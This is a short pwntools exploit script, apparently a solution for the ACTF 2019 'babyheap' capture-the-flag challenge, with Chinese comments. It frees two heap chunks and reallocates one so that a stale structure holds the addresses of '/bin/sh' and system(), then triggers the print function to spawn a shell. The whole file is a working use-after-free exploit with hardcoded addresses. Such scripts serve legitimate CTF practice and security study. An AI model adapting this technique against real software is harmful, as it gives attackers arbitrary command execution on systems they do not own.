from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p   = process('./ACTF_2019_babyheap')

binsh   = 0x602010
system  = 0x4007a0

def creat(size, content):
    p.recvuntil('Your choice: ')
    p.send('1')
    p.recvuntil('Please input size: ')
    p.send(size)
    p.recvuntil('Please input content: ')
    p.send(content)
def delete(index):
    p.recvuntil('Your choice: ')
    p.send('2')
    p.recvuntil('Please input list index: ')
    p.send(index)
def printf(index):
    p.recvuntil('Your choice: ')
    p.send('3')
    p.recvuntil('Please input list index: ')
    p.send(index)
    
creat('256', 'A' * 0x100)
creat('256', 'B' * 0x100)
delete('0')
delete('1')
# A的结构体部分设置为binsh system
# 打印的时候就会执行system(binsh)
creat('16', p64(binsh) + p64(system))
# 执行A
printf('0')

p.interactive()
